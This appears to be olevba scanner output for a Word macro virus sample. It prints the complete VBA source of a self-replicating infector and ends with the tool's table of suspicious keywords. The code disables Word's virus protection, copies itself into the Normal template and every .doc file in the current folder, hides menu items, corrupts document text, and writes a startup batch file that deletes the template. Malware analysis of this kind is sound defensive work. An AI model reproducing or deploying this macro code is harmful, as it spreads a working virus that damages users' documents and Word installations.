olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-0cdfadf7d0aa5c6c0a64478e38eaa56b9a5c4dae
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-0cdfadf7d0aa5c6c0a64478e38eaa56b9a5c4dae - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Win98.bas 
in file: Virus.MSWord.VMPC-based-0cdfadf7d0aa5c6c0a64478e38eaa56b9a5c4dae - OLE stream: 'Macros/VBA/Win98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Win98()
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("Win98").Export "c:\Win98.sys"
ActiveDocument.ReadOnlyRecommended = False
check = Int(Rnd * 1000)
If check = 24 Then Call Win98v
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox Chr(87) + Chr(73) + Chr(78) + Chr(57) + Chr(56) + Chr(32) + Chr(83) + Chr(85) + Chr(67) + Chr(75) + Chr(83), vbCritical
 f9517$ = "c:\windows\startm~1\programs\startup\msfile.bat"
j68657670 = GetAttr(NormalTemplate.FullName)
If j68657670 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call XWin98(f9517$)
If j68657670 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call XWin98(f9517$)
If j68657670 = vbReadOnly Then GoTo vWin98
If j68657670 = vbReadOnly + vbArchive Then GoTo vWin98
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Win98" Then nae7670485512 = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Win98" Then tgx485510 = True
Next I
If nae7670485512 = True And tgx485510 = False Then Set y485576706 = NormalTemplate.VBProject.VBComponents
If nae7670485512 = False And tgx485510 = True Then Set y485576706 = ActiveDocument.VBProject.VBComponents
y485576706.import "c:\Win98.sys"
If nae7670485512 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If tgx485510 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f12939 = m12129 & c5225 & Int(Rnd * 7393)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
vWin98:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox Chr(73) + Chr(78) + Chr(70) + Chr(69) + Chr(67) + Chr(84) + Chr(69) + Chr(68) + Chr(32) + Chr(49) + Chr(57) + Chr(57) + Chr(56) + Chr(32) + Chr(45) + Chr(32) + Chr(50) + Chr(48) + Chr(48) + Chr(48), vbInformation
    MsgBox Chr(66) + Chr(89) + Chr(32) + Chr(86) + Chr(73) + Chr(82) + Chr(85) + Chr(83), vbCritical
End Sub
Sub FileNew()
    On Error Resume Next
    Call Win98
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Win98
End Sub
Sub FileSave()
    On Error Resume Next
    Call Win98
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Win98
End Sub
Sub FileExit()
    On Error Resume Next
    Call Win98
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Win98
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Win98
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Win98
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Win98
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Win98
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Win98
End If
Loop
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
Sub Win98v()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "the"
            .Replacement.Text = "Win98"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
        CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
        CommandBars("edit").Controls("Repeat Replace...").Delete
        CommandBars("edit").Controls("Replace...").Delete
        CommandBars("edit").Controls("Find...").Delete
        CommandBars("tools").Controls("Spelling and Grammar...").Delete
        If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
    
Sub XWin98(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
|Hex String|hevp                |68657670                                     |
|Hex String|HUvp                |48557670                                     |
+----------+--------------------+---------------------------------------------+

